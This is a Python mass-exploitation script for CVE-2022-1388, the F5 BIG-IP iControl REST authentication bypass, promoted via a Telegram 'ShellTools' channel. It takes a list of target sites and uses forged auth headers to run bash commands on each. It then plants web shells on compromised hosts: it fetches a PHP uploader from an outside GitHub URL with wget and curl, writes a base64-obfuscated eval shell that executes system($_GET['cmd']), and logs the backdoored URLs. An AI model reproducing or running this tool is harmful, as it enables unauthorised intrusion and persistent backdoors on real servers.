# CVE/Info:    2022-1388, F5 BIG-IP iControl REST Vulnerability
# Coded BY JEX Coder  => T.me/ShellTools
import requests
import sys
from multiprocessing import Pool
from os import system, name
UploaderSource = 'https://raw.githubusercontent.com/Jexcoder/licenselist/main/up.php'
pasteBin = 'https://pastebin.com/raw/y46Km13C'
shell = '''<title>Vuln!! patch it Now!</title><?php echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if( $_POST['_upl'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }else { echo '<b>Not uploaded ! </b><br><br>'; }}?>'''

def clear():
    linux = 'clear'
    windows = 'cls'
    system([linux, windows][name == 'nt'])


def banner():
    sssss = '''
                        Coded BY JEX Coder [VIP]
              ______ _____   ____ _____ _____      _____ _____  
             |  ____| ____| |  _ \_   _/ ____|    |_   _|  __ \ 
             | |__  | |__   | |_) || || |  __ ______| | | |__) |
             |  __| |___ \  |  _ < | || | |_ |______| | |  ___/ 
             | |     ___) | | |_) || || |__| |     _| |_| |     
             |_|    |____/  |____/_____\_____|    |_____|_|     
                F5 BIG-IP Remote Code Execution - CVE-2022-1388
             
                           T.me/ShellTools                                      

    
    '''
    print(sssss)


def Exploit_CVE_2022_1388(url):
    if str(url).startswith('http://'):
        url = url.replace('http://', '')
    elif str(url).startswith('https://'):
        url = url.replace('https://', '')

    p_url = 'http://' + url + '/mgmt/tm/util/bash'
    p_header = {
        'Content-Type': 'application/json',
        'Connection': 'X-F5-Auth-Token',
        'X-F5-Auth-Token': 'CVE-2022-1388 Exploit TEST',
        'Authorization': 'Basic YWRtaW46dmFlbHdvbGY='
    }
    p_data = {
        'command': 'run',
        'utilCmdArgs': '-c "{}"'.format("echo CVE_2022_1388Vuln")
    }

    p_data2 = {
        'command': 'run',
        'utilCmdArgs': '-c "{}"'.format("wget 'https://raw.githubusercontent.com/Jexcoder/licenselist/main/up.php' -O up2.php")
    }
    p_data3 = {
        'command': 'run',
        'utilCmdArgs': '-c "{}"'.format("echo 'Vuln!! patch it Now!<?php {}(base64_decode('{}')); ?>' > vuln.php".format('eval', 'c3lzdGVtKCRfR0VUWyJjbWQiXSk7'))
    }
    p_data4 = {
        'command': 'run',
        'utilCmdArgs': '-c "{}"'.format("curl -O https://raw.githubusercontent.com/Jexcoder/licenselist/main/up.php")
    }
    try:
        r = requests.post(url=p_url, headers=p_header, json=p_data, timeout=7, verify=False)
        if r.json()['commandResult']:
            if 'CVE_2022_1388Vuln' in r.json()['commandResult']:
                print(' {} EXPLOITED> !~~~'.format(url))
                requests.post(url=p_url, headers=p_header, json=p_data2, timeout=7, verify=False)
                requests.post(url=p_url, headers=p_header, json=p_data3, timeout=7, verify=False)
                requests.post(url=p_url, headers=p_header, json=p_data4, timeout=7, verify=False)
                checksh1 = requests.get('http://' + url + '/mgmt/tm/util/up.php', timeout=6).content
                checksh2 = requests.get('http://' + url + '/mgmt/tm/util/up2.php', timeout=6).content
                checksh3 = requests.get('http://' + url + '/mgmt/tm/util/vuln.php', timeout=6).content
                if 'Vuln!!' in checksh1:
                    open('shell.txt', 'a').write('{}/mgmt/tm/util/up.php\n'.format(url))
                elif 'Vuln!!' in checksh2:
                    open('shell.txt', 'a').write('{}/mgmt/tm/util/up2.php\n'.format(url))
                elif 'Vuln!!' in checksh3:
                    open('shell.txt', 'a').write('{}/mgmt/tm/util/up.php\n'.format(url))
                open('Vulnerable.txt', 'a').write('{}\n'.format(url))
            else:
                print(' {} NOT EXPLOITED!'.format(url))
        else:
            print(' {} NOT Vulnerable!'.format(url))
    except:
        print(' {} NOT Vulnerable!'.format(url))



if __name__ == '__main__':
    try:
        clear()
        banner()
        sites = open(sys.argv[1], 'r').read().splitlines()
        p = Pool(35)
        p.map(Exploit_CVE_2022_1388, sites)
    except:
        clear()
        banner()
        print('     usage: python {} sites.txt'.format(sys.argv[0]))
        sys.exit()